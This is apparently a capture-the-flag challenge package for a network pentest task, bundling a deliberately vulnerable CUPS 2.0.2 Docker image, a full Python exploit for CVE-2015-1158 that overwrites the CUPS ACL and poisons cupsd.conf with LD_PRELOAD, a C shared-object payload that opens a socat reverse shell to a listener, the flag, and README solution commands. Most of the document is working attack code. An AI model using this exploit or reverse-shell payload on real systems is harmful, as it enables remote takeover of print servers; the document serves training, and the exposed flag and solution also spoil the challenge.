{
    ".gitignore": "*.out\n*.so\n",
    "config.yml": "# [default: None] A domain name to append to challenge names to create their default common name\ndomain: naum.tamuctf.com\n\n# [default: './challenges'] The directory which contains your challenges\n# If the the path is relative, it will be relative to the generated docker-compose.yml file\nchallenges_directory: ./challenges\n\n# [required] Configurations for each challenge\nchallenges:\n    spell-icups:\n        port: 2002\n        files:\n            - spell-icups/docker-compose.yml\n        commonname: 10.0.2.9\n        ifconfig_push: 172.30.0.14/28\n",
    "docker-compose.yml": "version: '2.4'\n\nx-limits: &limits\n    pids_limit: 1024\n    cpu_shares: 256\n    mem_limit: 512m\n    logging:\n        options:\n            max-size: 10m\n            max-file: '3'\n\nservices:\n    spell-icups:\n        <<: *limits\n        build: .\n        image: naumachia/spell-icups.actor\n        networks:\n            default:\n                ipv4_address: 172.30.0.2\n        ports:\n            - 631\n        restart: unless-stopped        \n\nnetworks:\n    default:\n        driver: l2bridge\n        ipam:\n            driver: static\n            config:\n                - subnet: 172.30.0.0/28\n",
    "Dockerfile": "FROM debian:buster-slim\nMAINTAINER Addison Crump \"addisoncrump@tamu.edu\"\n\nRUN apt update; apt -y --autoremove full-upgrade; apt -y install socat\n\nADD https://snapshot.debian.org/archive/debian/20150501T042823Z/pool/main/c/cups/cups_2.0.2-2_amd64.deb /tmp/\nADD https://snapshot.debian.org/archive/debian/20150501T042823Z/pool/main/c/cups/libcups2_2.0.2-2_amd64.deb /tmp/\nADD https://snapshot.debian.org/archive/debian/20150501T042823Z/pool/main/c/cups/libcupscgi1_2.0.2-2_amd64.deb /tmp/\nADD https://snapshot.debian.org/archive/debian/20150501T042823Z/pool/main/c/cups/libcupsmime1_2.0.2-2_amd64.deb /tmp/\nADD https://snapshot.debian.org/archive/debian/20150501T042823Z/pool/main/c/cups/libcupsppdc1_2.0.2-2_amd64.deb /tmp/\nADD https://snapshot.debian.org/archive/debian/20150501T042823Z/pool/main/c/cups/libcupsimage2_2.0.2-2_amd64.deb /tmp/\nADD https://snapshot.debian.org/archive/debian/20150501T042823Z/pool/main/c/cups/cups-core-drivers_2.0.2-2_amd64.deb /tmp/\nADD https://snapshot.debian.org/archive/debian/20150501T042823Z/pool/main/c/cups/cups-daemon_2.0.2-2_amd64.deb /tmp/\nADD https://snapshot.debian.org/archive/debian/20150501T042823Z/pool/main/c/cups/cups-client_2.0.2-2_amd64.deb /tmp/\nADD https://snapshot.debian.org/archive/debian/20150501T042823Z/pool/main/c/cups-filters/cups-filters_1.0.67-1_amd64.deb /tmp/\nADD https://snapshot.debian.org/archive/debian/20150501T042823Z/pool/main/c/cups-filters/cups-filters-core-drivers_1.0.67-1_amd64.deb /tmp/\nADD https://snapshot.debian.org/archive/debian/20150501T042823Z/pool/main/c/cups-pdf/cups-pdf_2.6.1-6_amd64.deb /tmp/\nADD http://security.debian.org/debian-security/pool/updates/main/p/poppler/libpoppler46_0.26.5-2+deb8u13_amd64.deb /tmp/\nADD http://http.us.debian.org/debian/pool/main/q/qpdf/libqpdf13_5.1.2-2_amd64.deb /tmp/\nADD http://security.debian.org/debian-security/pool/updates/main/g/gnutls28/libgnutls-deb0-28_3.3.30-0+deb8u1_amd64.deb /tmp/\nADD http://http.us.debian.org/debian/pool/main/n/nettle/libhogweed2_2.7.1-5+deb8u2_amd64.deb /tmp/\nADD http://http.us.debian.org/debian/pool/main/n/nettle/libnettle4_2.7.1-5+deb8u2_amd64.deb /tmp/\nADD http://http.us.debian.org/debian/pool/main/o/openjpeg/libopenjpeg5_1.5.2-3_amd64.deb /tmp/\nADD http://http.us.debian.org/debian/pool/main/libp/libpng/libpng12-0_1.2.50-2+deb8u3_amd64.deb /tmp/\n\nRUN apt -yf install /tmp/*.deb\nRUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*\n\nRUN cupsd; cupsctl --remote-admin --remote-any --share-printers; killall cupsd\n\nRUN sed -i 's/#AnonUser/AnonUser/g' /etc/cups/cups-pdf.conf\n\nCOPY flag.txt /root/flag.txt\n\nEXPOSE 631\nENTRYPOINT [\"/bin/bash\", \"-c\", \"cupsd; lpadmin -p pdf -E -m lsb/usr/cups-pdf/CUPS-PDF.ppd; sleep infinity\"]\n",
    "exploit.c": "#define _GNU_SOURCE\n#include <stdio.h>\n#include <unistd.h>\n#include <dlfcn.h>\n\nint main_hook(int argc, char **argv, char **envp)\n{\n    execle(\"/bin/bash\", \"bash\", \"-c\", \"socat tcp-connect:172.30.0.14:4444 exec:/bin/bash,pty,stderr,setsid,sigint,sane\", (char *) 0, (char *) 0);\n    return 0;\n}\n\nint __libc_start_main(\n    int (*main)(int, char **, char **),\n    int argc,\n    char **argv,\n    int (*init)(int, char **, char **),\n    void (*fini)(void),\n    void (*rtld_fini)(void),\n    void *stack_end)\n{\n    /* Find the real __libc_start_main()... */\n    typeof(&__libc_start_main) orig = dlsym(RTLD_NEXT, \"__libc_start_main\");\n\n    /* ... and call it with our custom main function */\n    return orig(main_hook, argc, argv, init, fini, rtld_fini, stack_end);\n}\n",
    "exploit.py": "#!/usr/bin/python\n# Exploit Title: CUPS Reference Count Over Decrement Remote Code Execution\n# Google Dork: n/a\n# Date: 2/2/17\n# Exploit Author: @0x00string\n# Vendor Homepage: cups.org\n# Software Link: https://github.com/apple/cups/releases/tag/release-2.0.2\n# Version: <2.0.3\n# Tested on: Ubuntu 14/15\n# CVE : CVE-2015-1158\nimport os, re, socket, random, time, getopt, sys\nfrom socket import *\nfrom struct import *\n\ndef banner():\n    print '''\n             lol ty google\n             0000000000000\n          0000000000000000000   00\n       00000000000000000000000000000\n      0000000000000000000000000000000\n    000000000             0000000000\n   00000000               0000000000\n  0000000                000000000000\n 0000000               000000000000000\n 000000              000000000  000000\n0000000            000000000     000000\n000000            000000000      000000\n000000          000000000        000000\n000000         00000000          000000\n000000       000000000           000000\n0000000    000000000            0000000\n 000000   000000000             000000\n 0000000000000000              0000000\n  0000000000000               0000000\n   00000000000              00000000\n   00000000000            000000000\n  0000000000000000000000000000000\n   00000000000000000000000000000\n     000  0000000000000000000\n             0000000000000\n              @0x00string\nhttps://github.com/0x00string/oldays/blob/master/CVE-2015-1158.py\n'''\n\ndef usage ():\n    print   (\"python script.py <args>\\n\"\n            \"   -h, --help:             Show this message\\n\"\n            \"   -a, --rhost:            Target IP address\\n\"\n            \"   -b, --rport:            Target IPP service port (default: 631)\\n\"\n            \"   -c, --lib               /path/to/payload.so\\n\"\n            \"   -f, --stomp-only        Only stomp the ACL (no postex)\\n\"\n            \"\\n\"\n            \"Examples:\\n\"\n            \"python script.py -a 10.10.10.10 -b 631 -f\\n\"\n            \"python script.py -a 10.10.10.10 -b 631 -c /tmp/x86reverseshell.so\\n\")\n    exit()\n\ndef pretty (t, m):\n        if (t is \"+\"):\n                print \"\\x1b[32;1m[+]\\x1b[0m\\t\" + m + \"\\n\",\n        elif (t is \"-\"):\n                print \"\\x1b[31;1m[-]\\x1b[0m\\t\" + m + \"\\n\",\n        elif (t is \"*\"):\n                print \"\\x1b[34;1m[*]\\x1b[0m\\t\" + m + \"\\n\",\n        elif (t is \"!\"):\n                print \"\\x1b[33;1m[!]\\x1b[0m\\t\" + m + \"\\n\",\n\ndef createDump (input):\n        d, b, h = '', [], []\n        u = list(input)\n        for e in u:\n                h.append(e.encode(\"hex\"))\n                if e == '0x0':\n                        b.append('0')\n                elif 30 > ord(e) or ord(e) > 128:\n                        b.append('.')\n                elif 30 < ord(e) or ord(e) < 128:\n                        b.append(e)\n\n        i = 0\n        while i < len(h):\n                if (len(h) - i ) >= 16:\n                        d += ' '.join(h[i:i+16])\n                        d += \"         \"\n                        d += ' '.join(b[i:i+16])\n                        d += \"\\n\"\n                        i = i + 16\n                else:\n                        d += ' '.join(h[i:(len(h) - 0 )])\n                        pad = len(' '.join(h[i:(len(h) - 0 )]))\n                        d += ' ' * (56 - pad)\n                        d += ' '.join(b[i:(len(h) - 0 )])\n                        d += \"\\n\"\n                        i = i + len(h)\n\n        return d\n\nclass tcpsock:\n    def __init__(self, sock=None):\n        if sock is None:\n            self.sock = socket(\n            AF_INET, SOCK_STREAM)\n            self.sock.settimeout(30)\n        else:\n            self.sock = sock\n    def connect(self, host, port):\n        self.sock.connect((host, int(port)))\n    def tx(self, msg):\n        self.sock.send(msg)\n    def rx(self):\n        tmp  = self.sock.recv(1024)\n        msg = \"\"\n        while tmp:\n            msg += tmp\n            tmp  = self.sock.recv(1024)\n        return msg\n\ndef txrx (ip, port, proto, txpacket):\n    if (proto is \"tcp\"):\n        sock = tcpsock()\n    elif (proto is \"udp\"):\n        sock = udpsock()\n    else:\n        return None\n    sock.connect(ip, port)\n    sock.tx(txpacket)\n    rxpacket = sock.rx()\n    return rxpacket\n\ndef locatePrinters(rhost, rport=\"631\"):\n    request = ( \"GET /printers HTTP/1.1\\x0d\\x0a\"\n        \"Host: \" + rhost + \":\" + rport + \"\\x0d\\x0a\"\n        \"User-Agent: CUPS/2.0.2\\x0d\\x0a\"\n        \"Connection: Close\\x0d\\x0a\"\n        \"\\x0d\\x0a\")\n    response = txrx(rhost, int(rport), \"tcp\", request)\n    if response is not None:\n        m = re.search('<TR><TD><A HREF=\"(.+)\">.+</A></TD><TD>.+</TD><TD></TD><TD>.+</TD><TD>', response)\n        if m is not None:\n            printer = m.group(1)\n            pretty(\"+\",\"printer found: \" + printer)\n            return printer\n        else:\n            pretty(\"-\",\"no printers\")\n            exit(1)\n    else:\n        pretty(\"-\",\"no printers\")\n        exit(1)\n\ndef preparePayload(libpath):\n    with open(libpath, 'rb') as f:\n        payload = f.read()\n    if payload is not None:\n        pretty(\"*\",\"Payload:\\n\" + createDump(payload))\n    else:\n        pretty(\"-\",\"something went wrong\")\n        usage()\n    return payload\n\ndef seedTarget(rhost, rport, printer, payload):\n    i = random.randint(1,3)\n    reqid = str(pack(\">i\",(i+2)))\n    reqid2 = str(pack(\">i\",(i+3)))\n    printer_uri = \"ipp://\" + rhost + \":\" + str(rport) + printer\n\n    create_job_packet = (\"\\x02\\x00\"\n                         \"\\x00\\x05\"+\n                         reqid+\n                         \"\\x01\"\n                         \"\\x47\"+\"\\x00\\x12\"+\"attributes-charset\"+\"\\x00\\x05\"+\"utf-8\"\n                         \"\\x48\"+\"\\x00\\x1b\"+\"attributes-natural-language\"+\"\\x00\\x05\"+\"en-us\"\n                         \"\\x45\"+\"\\x00\\x0b\"+\"printer-uri\" + str(pack(\">h\", len(printer_uri))) + printer_uri +\n                         \"\\x42\"+\"\\x00\\x14\"+\"requesting-user-name\"+\"\\x00\\x04\"+\"root\"\n                         \"\\x42\"+\"\\x00\\x08\"+\"job-name\"+\"\\x00\\x06\"+\"badlib\"\n                         \"\\x02\"\n                         \"\\x21\"+\"\\x00\\x06\"+\"copies\"+\"\\x00\\x04\"+\"\\x00\\x00\\x00\\x01\"\n                         \"\\x23\"+\"\\x00\\x0a\"+\"finishings\"+\"\\x00\\x04\"+\"\\x00\\x00\\x00\\x03\"\n                         \"\\x42\"+\"\\x00\\x10\"+\"job-cancel-after\"+\"\\x00\\x05\"+\"\\x31\\x30\\x38\\x30\\x30\"\n                         \"\\x44\"+\"\\x00\\x0e\"+\"job-hold-until\"+\"\\x00\\x0a\"+\"indefinite\"\n                         \"\\x21\"+\"\\x00\\x0c\"+\"job-priority\"+\"\\x00\\x04\"+\"\\x00\\x00\\x00\\x32\"\n                         \"\\x42\"+\"\\x00\\x0a\"+\"job-sheets\"+\"\\x00\\x04\"+\"none\"+\"\\x42\"+\"\\x00\\x00\\x00\\x04\"+\"none\"\n                         \"\\x21\"+\"\\x00\\x09\"+\"number-up\"+\"\\x00\\x04\"+\"\\x00\\x00\\x00\\x01\"\n                         \"\\x03\")\n    pretty(\"*\",\"Sending createJob\")\n\n    http_header1 = ( \"POST \" + printer + \" HTTP/1.1\\x0d\\x0a\"\n                        \"Content-Type: application/ipp\\x0d\\x0a\"\n                        \"Host: \" + rhost + \":\" + str(rport) + \"\\x0d\\x0a\"\n                        \"User-Agent: CUPS/2.0.2\\x0d\\x0a\"\n                        \"Connection: Close\\x0d\\x0a\"\n                        \"Content-Length: \" + str(len(create_job_packet) + 0) + \"\\x0d\\x0a\"\n                        \"\\x0d\\x0a\")\n\n    createJobRequest = http_header1 + create_job_packet\n    blah = txrx(rhost,int(rport),\"tcp\",createJobRequest)\n    if blah is not None:\n        m = re.search(\"ipp://\" + rhost + \":\" + str(rport) + \"/jobs/(\\d+)\",blah)\n        if m is not None:\n            jobid = m.group(1)\n    else:\n        pretty(\"-\",\"something went wrong\");\n        exit()\n\n    pretty(\"*\",\"\\n\" + createDump(blah) + \"\\n\")\n    pretty(\"*\", \"Sending sendJob\")\n\n    send_document_packet = (\"\\x02\\x00\"\n                            \"\\x00\\x06\"+\n                            reqid2+\n                            \"\\x01\"\n                            \"\\x47\"+\"\\x00\\x12\"+\"attributes-charset\"+\"\\x00\\x05\"+\"utf-8\"\n                            \"\\x48\"+\"\\x00\\x1b\"+\"attributes-natural-language\"+\"\\x00\\x05\"+\"en-us\"\n                            \"\\x45\"+\"\\x00\\x0b\"+\"printer-uri\" + str(pack(\">h\", len(printer_uri))) + printer_uri +\n                            \"\\x21\"+\"\\x00\\x06\"+\"job-id\"+\"\\x00\\x04\"+ str(pack(\">i\", int(jobid))) +\n                            \"\\x42\"+\"\\x00\\x14\"+\"requesting-user-name\"+\"\\x00\\x04\"+\"root\"\n                            \"\\x42\"+\"\\x00\\x0d\"+\"document-name\"+\"\\x00\\x06\"+\"badlib\"\n                            \"\\x49\"+\"\\x00\\x0f\"+\"document-format\"+\"\\x00\\x18\"+\"application/octet-stream\"\n                            \"\\x22\"+\"\\x00\\x0d\"+\"last-document\"+\"\\x00\\x01\"+\"\\x01\"\n                            \"\\x03\"+\n                            payload)\n\n    http_header2 = ( \"POST \" + printer + \" HTTP/1.1\\x0d\\x0a\"\n                        \"Content-Type: application/ipp\\x0d\\x0a\"\n                        \"Host: \" + rhost + \":\" + str(rport) + \"\\x0d\\x0a\"\n                        \"User-Agent: CUPS/2.0.2\\x0d\\x0a\"\n                        \"Connection: Close\\x0d\\x0a\"\n                        \"Content-Length: \" + str(len(send_document_packet) + 0) + \"\\x0d\\x0a\"\n                        \"\\x0d\\x0a\")\n\n    sendJobRequest = http_header2 + send_document_packet\n    blah2 = txrx(rhost,int(rport),\"tcp\",sendJobRequest)\n    pretty(\"*\",\"\\n\" + createDump(blah) + \"\\n\")\n    pretty(\"*\",\"job id: \" + jobid)\n    return jobid\n\ndef stompACL(rhost, rport, printer):\n    i = random.randint(1,1024)\n    printer_url = \"ipp://\" + rhost + \":\" + rport + printer\n\n    admin_stomp = (\"\\x02\\x00\"      #   vers 2.0\n                \"\\x00\\x05\"+     #   op id: Create Job (0x0005)\n                str(pack(\">i\",(i+1)))+\n                \"\\x01\"      #   op attributes marker\n                \"\\x47\"      #   charset\n                \"\\x00\\x12\"      #   name len: 18\n                \"attributes-charset\"\n                \"\\x00\\x08\"      #   val len: 8\n                \"us-ascii\"\n                \"\\x48\"      #   natural language\n                \"\\x00\\x1b\"      #   name len: 27\n                \"attributes-natural-language\"\n                \"\\x00\\x06\"      #   val len: 6\n                \"/admin\"\n                \"\\x45\"      #   printer-uri\n                \"\\x00\\x0b\"      #   name len 11\n                \"printer-uri\" +\n                str(pack(\">h\", len(printer_url))) + printer_url +\n                \"\\x42\"      #   name without lang\n                \"\\x00\\x14\"      #   name len: 20\n                \"requesting-user-name\"\n                \"\\x00\\x06\"      #   val len: 6\n                \"/admin\"\n                \"\\x02\"      #   job attrs marker\n                \"\\x21\"      #   integer\n                \"\\x00\\x06\"      #   name len: 6\n                \"copies\"\n                \"\\x00\\x04\"      #   val len: 4\n                \"\\x00\\x00\\x00\\x01\"  #   1\n                \"\\x42\"      #   name w/o lang\n                \"\\x00\\x19\"      #   name len: 25\n                \"job-originating-host-name\"\n                \"\\x00\\x0c\"      #   val len: 12\n                \"AAAAAAAAAAAA\"\n                \"\\x42\"      #   nwol\n                \"\\x00\\x00\"      #   name len: 0\n                \"\\x00\\x0c\"      #   val len: 12\n                \"AAAAAAAAAAAA\"\n                \"\\x42\"      #   nwol\n                \"\\x00\\x00\"      #   name len: 0\n                \"\\x00\\x0c\"      #   val len: 12\n                \"AAAAAAAAAAAA\"\n                \"\\x42\"      #   nwol\n                \"\\x00\\x00\"      #   name len: 0\n                \"\\x00\\x0c\"      #   val len: 12\n                \"AAAAAAAAAAAA\"\n                \"\\x42\"      #   nwol\n                \"\\x00\\x00\"      #   name len: 0\n                \"\\x00\\x0c\"      #   val len: 12\n                \"AAAAAAAAAAAA\"\n                \"\\x42\"      #   nwol\n                \"\\x00\\x00\"      #   name len: 0\n                \"\\x00\\x0c\"      #   val len: 12\n                \"AAAAAAAAAAAA\"\n                \"\\x42\"      #   nwol\n                \"\\x00\\x00\"      #   name len: 0\n                \"\\x00\\x0c\"      #   val len: 12\n                \"AAAAAAAAAAAA\"\n                \"\\x42\"      #   nwol\n                \"\\x00\\x00\"      #   name len: 0\n                \"\\x00\\x0c\"      #   val len: 12\n                \"AAAAAAAAAAAA\"\n                \"\\x42\"      #   nwol\n                \"\\x00\\x00\"      #   name len: 0\n                \"\\x00\\x0c\"      #   val len: 12\n                \"AAAAAAAAAAAA\"\n                \"\\x42\"      #   nwol\n                \"\\x00\\x00\"      #   name len: 0\n                \"\\x00\\x0c\"      #   val len: 12\n                \"AAAAAAAAAAAA\"\n                \"\\x42\"      #   nwol\n                \"\\x00\\x00\"      #   name len: 0\n                \"\\x00\\x0c\"      #   val len: 12\n                \"AAAAAAAAAAAA\"\n                \"\\x42\"      #   nwol\n                \"\\x00\\x00\"      #   name len: 0\n                \"\\x00\\x0c\"      #   val len: 12\n                \"AAAAAAAAAAAA\"\n                \"\\x36\"      #   nwl\n                \"\\x00\\x00\"      #   name len: 0\n                \"\\x00\\x16\"      #   val len: 22\n                \"\\x00\\x06\"      #   length\n                \"/admin\"\n                \"\\x00\\x0c\"\n                \"BBBBBBBBBBBB\"\n                \"\\x03\")      #   end of attributes\n\n    conf_stomp = (\"\\x02\\x00\"        #   vers 2.0\n                \"\\x00\\x05\"+     #   op id: Create Job (0x0005)\n                str(pack(\">i\",(i+2)))+\n                \"\\x01\"      #   op attributes marker\n                \"\\x47\"      #   charset\n                \"\\x00\\x12\"      #   name len: 18\n                \"attributes-charset\"\n                \"\\x00\\x08\"      #   val len: 8\n                \"us-ascii\"\n                \"\\x48\"      #   natural language\n                \"\\x00\\x1b\"      #   name len: 27\n                \"attributes-natural-language\"\n                \"\\x00\\x0b\"      #   val len: 11\n                \"/admin/conf\"\n                \"\\x45\"      #   printer-uri\n                \"\\x00\\x0b\"      #   name len 11\n                \"printer-uri\" +\n                str(pack(\">h\", len(printer_url))) + printer_url +\n                \"\\x42\"      #   name without lang\n                \"\\x00\\x14\"      #   name len: 20\n                \"requesting-user-name\"\n                \"\\x00\\x0b\"      #   val len: 11\n                \"/admin/conf\"\n                \"\\x02\"      #   job attrs marker\n                \"\\x21\"      #   integer\n                \"\\x00\\x06\"      #   name len: 6\n                \"copies\"\n                \"\\x00\\x04\"      #   val len: 4\n                \"\\x00\\x00\\x00\\x01\"  #   1\n                \"\\x42\"      #   name w/o lang\n                \"\\x00\\x19\"      #   name len: 25\n                \"job-originating-host-name\"\n                \"\\x00\\x0c\"      #   val len: 12\n                \"AAAAAAAAAAAA\"\n                \"\\x42\"      #   nwol\n                \"\\x00\\x00\"      #   name len: 0\n                \"\\x00\\x0c\"      #   val len: 12\n                \"AAAAAAAAAAAA\"\n                \"\\x42\"      #   nwol\n                \"\\x00\\x00\"      #   name len: 0\n                \"\\x00\\x0c\"      #   val len: 12\n                \"AAAAAAAAAAAA\"\n                \"\\x42\"      #   nwol\n                \"\\x00\\x00\"      #   name len: 0\n                \"\\x00\\x0c\"      #   val len: 12\n                \"AAAAAAAAAAAA\"\n                \"\\x42\"      #   nwol\n                \"\\x00\\x00\"      #   name len: 0\n                \"\\x00\\x0c\"      #   val len: 12\n                \"AAAAAAAAAAAA\"\n                \"\\x42\"      #   nwol\n                \"\\x00\\x00\"      #   name len: 0\n                \"\\x00\\x0c\"      #   val len: 12\n                \"AAAAAAAAAAAA\"\n                \"\\x42\"      #   nwol\n                \"\\x00\\x00\"      #   name len: 0\n                \"\\x00\\x0c\"      #   val len: 12\n                \"AAAAAAAAAAAA\"\n                \"\\x42\"      #   nwol\n                \"\\x00\\x00\"      #   name len: 0\n                \"\\x00\\x0c\"      #   val len: 12\n                \"AAAAAAAAAAAA\"\n                \"\\x42\"      #   nwol\n                \"\\x00\\x00\"      #   name len: 0\n                \"\\x00\\x0c\"      #   val len: 12\n                \"AAAAAAAAAAAA\"\n                \"\\x42\"      #   nwol\n                \"\\x00\\x00\"      #   name len: 0\n                \"\\x00\\x0c\"      #   val len: 12\n                \"AAAAAAAAAAAA\"\n                \"\\x42\"      #   nwol\n                \"\\x00\\x00\"      #   name len: 0\n                \"\\x00\\x0c\"      #   val len: 12\n                \"AAAAAAAAAAAA\"\n                \"\\x42\"      #   nwol\n                \"\\x00\\x00\"      #   name len: 0\n                \"\\x00\\x0c\"      #   val len: 12\n                \"AAAAAAAAAAAA\"\n                \"\\x36\"      #   nwl\n                \"\\x00\\x00\"      #   name len: 0\n                \"\\x00\\x1b\"      #   val len: 27\n                \"\\x00\\x0b\"      #   length\n                \"/admin/conf\"\n                \"\\x00\\x0c\"\n                \"BBBBBBBBBBBB\"\n                \"\\x03\")      #   end of attributes\n\n    http_header1 = (\"POST \" + printer + \" HTTP/1.1\\x0d\\x0a\"\n                    \"Content-Type: application/ipp\\x0d\\x0a\"\n                    \"Host: \" + rhost + \":\" + rport + \"\\x0d\\x0a\"\n                    \"User-Agent: CUPS/2.0.2\\x0d\\x0a\"\n                    \"Connection: Close\\x0d\\x0a\"\n                    \"Content-Length: \" + str(len(admin_stomp)) + \"\\x0d\\x0a\"\n                    \"\\x0d\\x0a\")\n\n    http_header2 = (\"POST \" + printer + \" HTTP/1.1\\x0d\\x0a\"\n                    \"Content-Type: application/ipp\\x0d\\x0a\"\n                    \"Host: \" + rhost + \":\" + rport + \"\\x0d\\x0a\"\n                    \"User-Agent: CUPS/2.0.2\\x0d\\x0a\"\n                    \"Connection: Close\\x0d\\x0a\"\n                    \"Content-Length: \" + str(len(conf_stomp)) + \"\\x0d\\x0a\"\n                    \"\\x0d\\x0a\")\n\n    pretty(\"*\",\"stomping ACL\")\n    pretty(\"*\",\">:\\n\" + createDump(http_header1 + admin_stomp))\n    pretty(\"*\",\"<:\\n\" + createDump(txrx(rhost,rport,\"tcp\",http_header1 + admin_stomp)))\n    time.sleep(1)\n    pretty(\"*\",\">:\\n\" + createDump(http_header2 + conf_stomp))\n    pretty(\"*\",\"<:\\n\" + createDump(txrx(rhost,rport,\"tcp\",http_header2 + conf_stomp)))\n\n    http_header_check = (\"GET /admin HTTP/1.1\\x0d\\x0a\"\n                        \"Host: \" + rhost + \":\" + rport + \"\\x0d\\x0a\"\n                        \"User-Agent: CUPS/2.0.2\\x0d\\x0a\"\n                        \"Connection: Close\\x0d\\x0a\"\n                        \"\\x0d\\x0a\")\n    pretty(\"*\",\"checking /admin\")\n    pretty(\"*\",\">:\\n\" + createDump(http_header_check))\n    res = txrx(rhost,rport,\"tcp\",http_header_check)\n    pretty(\"*\",\"<:\\n\" + createDump(res))\n    m = re.search('200 OK', res)\n    if m is not None:\n        pretty(\"+\",\"ACL stomp successful\")\n    else:\n        pretty(\"-\",\"exploit failed\")\n        exit(1)\n\n\ndef getConfig(rhost, rport):\n    i = random.randint(1,1024)\n    original_config = \"\"\n    http_request = (\"GET /admin/conf/cupsd.conf HTTP/1.1\\x0d\\x0a\"\n                    \"Host: \" + rhost + \":\" + rport + \"\\x0d\\x0a\"\n                    \"User-Agent: CUPS/2.0.2\\x0d\\x0a\"\n                    \"Connection: Close\\x0d\\x0a\"\n                    \"\\x0d\\x0a\")\n\n    pretty(\"*\",\"grabbing configuration file....\")\n    res = txrx(rhost,rport,\"tcp\",http_request)\n    res_array = res.split(\"\\x0d\\x0a\\x0d\\x0a\")\n    original_config = res_array[1]\n    pretty(\"*\",\"config:\\n\" + original_config + \"\\n\")\n    return original_config\n\ndef putConfig(rhost, rport, config):\n    http_request = (\"PUT /admin/conf/cupsd.conf HTTP/1.1\\x0d\\x0a\"\n                    \"Content-Type: application/ipp\\x0d\\x0a\"\n                    \"Host: \" + rhost + \":\" + rport + \"\\x0d\\x0a\"\n                    \"User-Agent: CUPS/2.0.2\\x0d\\x0a\"\n                    \"Connection: Keep-Alive\\x0d\\x0a\"\n                    \"Content-Length: \" + str(len(config)) + \"\\x0d\\x0a\"\n                    \"\\x0d\\x0a\")\n    pretty(\"*\",\"overwriting config...\")\n    pretty(\"*\",\">:\\n\" + createDump(http_request + config))\n    pretty(\"*\",\"<:\\n\" + createDump(txrx(rhost,rport,\"tcp\",http_request + config)))\n\ndef poisonConfig(config, name):\n    config = config + \"\\x0a\\x0aSetEnv LD_PRELOAD /var/spool/cups/d\" + \"0\" * (5-len(name)) + name + \"-001\\x0a\"\n    return config\n\ndef main():\n    rhost = None;\n    rport = \"631\";\n    noshell = None;\n    options, remainder = getopt.getopt(sys.argv[1:], 'a:b:c:fh', ['rhost=','rport=','lib=','stomp-only','help'])\n    for opt, arg in options:\n        if opt in ('-h', '--help'):\n            usage()\n        elif opt in ('-a','--rhost'):\n            rhost = arg;\n        elif opt in ('-b','--rport'):\n            rport = arg;\n        elif opt in ('-c','--lib'):\n            libpath = arg;\n        elif opt in ('-f','--stomp-only'):\n            noshell = 1;\n    banner()\n    if rhost is None or rport is None:\n        usage()\n    pretty(\"*\",\"locate available printer\")\n    printer = locatePrinters(rhost, rport)\n    pretty(\"*\",\"stomp ACL\")\n    stompACL(rhost, rport, printer)\n    if (noshell is not None):\n        pretty(\"*\",\"fin\")\n        exit(0)\n    pretty(\"*\",\"prepare payload\")\n    payload = preparePayload(libpath)\n    pretty(\"*\",\"spray payload\")\n    jobid = seedTarget(rhost, rport, printer, payload)\n    pretty(\"*\",\"grab original config\")\n    OG_config = getConfig(rhost, rport)\n    pretty(\"*\",\"generate poison config\")\n    evil_config = poisonConfig(OG_config, jobid)\n    pretty(\"*\",\"upload poison config\")\n    putConfig(rhost, rport, evil_config)\n    pretty(\"*\",\"fin\")\n    exit(0);\n\nif __name__ == \"__main__\":\n    main()\n",
    "flag.txt": "gigem{h4ha_y0u_s41D_1t_hah4}\n",
    "README.md": "# Spell ICUPS\n\n```\nI turned on a small CUPS server we found in the back for saving PDFs that we make locally. Didn't have SSH or anything, though, but thankfully it had socat.\n```\n\n## Documentation\n\nExisting exploit, non-existent payload. Competitors have to make their own exploitative shared object library. Fun!\n\n### Setup\n\n1. docker build . -t spell-icups\n2. docker run --rm -it spell-icups\n\n## Solution\n\n```\ngcc exploit.c -o exploit.so -fPIC -shared -ldl\npython exploit.py -a 172.30.0.2 -b 631 -c exploit.so\npython exploit.py -a 172.30.0.2 -b 631 -f >/dev/null & socat file:`tty`,raw,echo=0 tcp-listen:4444\n```\n",
    "category": "NetworkPentest"
}